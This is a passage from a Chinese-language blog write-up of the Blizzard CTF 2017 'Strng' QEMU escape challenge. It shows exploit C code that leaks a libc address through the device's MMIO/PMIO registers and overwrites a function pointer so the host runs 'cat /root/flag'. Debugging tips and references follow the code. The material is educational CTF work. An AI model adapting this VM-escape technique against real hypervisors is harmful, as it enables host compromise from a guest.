</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inl</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outl</span><span class=p>(</span><span class=n>value</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>arb_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>0</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>pmio_read</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>arb_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>0</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span> <span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// change I/O privilege level
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>iopl</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;iopl failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// mmap device mmio space
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>fd</span><span class=o>=</span><span class=nf>open</span><span class=p>(</span><span class=n>mmio_path</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_SYNC</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;open device mmio failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>mmio_mem</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>MAP_SIZE</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>mmio_mem</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;mmap failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    $ python3
</span></span></span><span class=line><span class=cl><span class=cm>    &gt;&gt;&gt; from pwn import *
</span></span></span><span class=line><span class=cl><span class=cm>    &gt;&gt;&gt; list(map(hex, unpack_many(b&#34;cat /root/flag  &#34;)))   # string align with 4
</span></span></span><span class=line><span class=cl><span class=cm>    [&#39;0x20746163&#39;, &#39;0x6f6f722f&#39;, &#39;0x6c662f74&#39;, &#39;0x20206761&#39;]
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>    <span class=nf>mmio_write</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span> <span class=mh>0x20746163</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>mmio_write</span><span class=p>(</span><span class=mh>0xc</span><span class=p>,</span> <span class=mh>0x6f6f722f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>mmio_write</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x6c662f74</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>mmio_write</span><span class=p>(</span><span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x20206761</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// mmio_write(0x8, 0x20006873);    // system(&#34;sh&#34;); freeze after print &#34;sh: turning off NDELAY mode&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>srand_addr</span> <span class=o>=</span> <span class=nf>arb_read</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>srand_addr</span> <span class=o>=</span> <span class=p>(</span><span class=nf>arb_read</span><span class=p>(</span><span class=mh>0x104</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>srand_addr</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>system_addr</span> <span class=o>=</span> <span class=n>srand_addr</span> <span class=o>+</span> <span class=mh>0xac50</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>arb_write</span><span class=p>(</span><span class=mh>0x114</span><span class=p>,</span> <span class=n>system_addr</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>mmio_write</span><span class=p>(</span><span class=mh>0xc</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=tips>tips<a hidden class=anchor aria-hidden=true href=#tips>#</a></h2><p>打印struct偏移</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>gdb&gt; print <span class=o>(</span>int<span class=o>)</span><span class=p>&amp;</span><span class=o>((</span>STRNGState*<span class=o>)</span>0<span class=o>)</span>-&gt;srand
</span></span><span class=line><span class=cl>gdb&gt; ptype /o STRNGState
</span></span><span class=line><span class=cl>pwndbg&gt; dt STRNGState
</span></span></code></pre></td></tr></table></div></div><p>pahole导出elf中的structs</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo apt install dwarves
</span></span><span class=line><span class=cl>$ pahole -V qemu-system-x86_64 &gt; structs  <span class=c1># 导出并不完全，STRNGState不会被找到，是因为typedef的原因？</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=后记>后记<a hidden class=anchor aria-hidden=true href=#后记>#</a></h2><p>要做出来STRNG这道题目，很关键的一点就是发现STRNGState结构体，知道了这个，那几个read、write函数就没有那么抽象了，漏洞也很清晰明了，所以这是很关键的问题。但是我看的几个WriteUp都没有说如何确定的这个结构。这可能就是比赛时solves: 0的原因吧。</p><p>尝试一：以state为关键字，在ida的structures标签页中搜索结构体，搜不到。</p><p>尝试二：使用pahole导出struct，也没有</p><p>后来看源码发现这个结构体是被<code>typedef</code>成了STRNDState的名字，本身并没有名字，这是不是上面找不到的原因？</p><p>(PS: disqus判定评论是否为spam的检查太垃圾了，在raycp大佬文章下面发了两个评论询问这个问题，都被这个gdx屏蔽了)</p><br><p>前期花了太多的时间想彻底搞明白qemu虚拟设备的创建(经常会有这种莫名的强迫症&mldr;)，但是看来看去都模模糊糊的，是真的菜啊我。察觉这个状态后，想起教主的“先干起来，慢慢补充”，才继续关注题目本身。其实看两个简单的虚拟设备例子，做这个题目就没问题了。</p><blockquote><p>2020-11-28</p><p>在ida的local types窗口可以检索到STRNGState</p></blockquote><h2 id=reference>Reference<a hidden class=anchor aria-hidden=true href=#reference>#</a></h2><ol><li><a href=https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge>qemu-pwn-基础知识</a></li><li><a href=https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup>qemu pwn-Blizzard CTF 2017 Strng writeup</a></li><li><a href=https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html>BlizzardCTF 2017 - Strng</a></li><li><a href=https://wiki.osdev.org/PCI#Base_Address_Registers>osdev PCI BAR</a></li><li><a href=https://www.cnblogs.com/machangwei-8/p/10403495.html>lspci命令详解</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/ctf/>CTF</a></li><li><a href=https://hhdx.xyz/tags/qemu/>Qemu</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>